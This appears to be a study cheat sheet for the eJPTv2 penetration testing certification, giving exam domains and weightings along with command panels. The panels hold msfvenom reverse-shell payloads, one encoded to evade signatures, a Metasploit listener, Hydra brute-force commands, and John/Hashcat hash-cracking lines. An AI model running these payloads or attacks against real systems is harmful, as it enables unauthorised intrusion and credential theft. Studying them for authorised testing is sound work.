Domains + Objectives

What the exam actually grades

eJPTv2 is entry-level and hands-on: it simulates real engagement tasks rather than asking theory questions in isolation. Each domain below is scored against the objectives INE lists for it.

Host & Network Penetration Testing

35%
  • Identify and modify public exploits
  • Conduct exploitation with Metasploit
  • Demonstrate pivoting via routes and port forwarding
  • Run brute-force password attacks and crack hashes

Assessment Methodologies

25%
  • Locate endpoints on a network
  • Identify open ports, services, and OS on a target
  • Pull company and email intel from public sources
  • Identify and triage vulnerabilities by impact

Host & Network Auditing

25%
  • Compile and enumerate information from files on a target
  • Enumerate system and network info on a target
  • Gather user accounts, hashes, and passwords
  • Transfer files to and from a target

Web Application Penetration Testing

15%
  • Identify vulnerabilities in web applications
  • Locate hidden files and directories
  • Conduct brute-force login attacks
  • Carry out web app reconnaissance

Nmap is the workhorse here — the flag combinations below cover most of what the exam's lab network needs.

Payloads & Shells

3 panels›

Generating payloads, catching them, and the one-liners for when you land on a box without Metasploit.

msfvenom.sh
# Windows x64
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > payload.exe

# Linux x64
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf > payload.elf

# PHP web shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw > shell.php

# Encoded to dodge basic signatures
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i 10 -f exe > payload_enc.exe

# Catch it
use multi/handler
set payload <same as above>
set LHOST <LHOST>
set LPORT <LPORT>
run

# Listener on attacker box

# Reverse shell one-liners (run on target)

Credential Attacks & Cracking

2 panels›

Online brute-forcing with Hydra and offline cracking once you have a hash dump.

hydra.sh
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ssh
hydra -L <USERS> -P <PASSWORDS> <TARGET_IP> smb -t 4
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> \
  http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

-l / -L single or list of users   -p / -P single or list of passwords
-t parallel tasks   -f stop on first hit   -V verbose
cracking.sh
gzip -d /usr/share/wordlists/rockyou.txt.gz

# John
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
unshadow passwd shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

# Hashcat
hashcat -a 0 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt   # NTLM
hashcat -a 0 -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt   # sha512crypt
hashcat -a 0 -m 1000 --show hashes.txt

Exam Day

How the certification works

Confirmed details from INE Security's certification page, plus general strategy worth keeping in mind.

01Entry-level, hands-on. eJPT simulates real engagement tasks — assessment methodology, host/network auditing and pentesting, and web app testing — rather than asking multiple-choice theory questions in isolation.
02Weight your prep by domain. Host & Network Penetration Testing carries the most weight at 35%, with Assessment Methodologies and Host & Network Auditing close behind at 25% each — comfort with Metasploit, pivoting, and credential attacks pays off more than any single topic.
03Mind the voucher clock. A regular voucher expires 180 days after purchase, and if you don't pass on the first attempt, the included free retake has to happen within 14 days — both attempts must land before the voucher expires.
04Results come fast. Scoring is automated, with a section-by-section breakdown usually delivered within a few hours — use it to see which domain needs more practice before any retake.
05Certification lasts three years. From the date it's awarded, after which INE's renewal options keep the credential current.
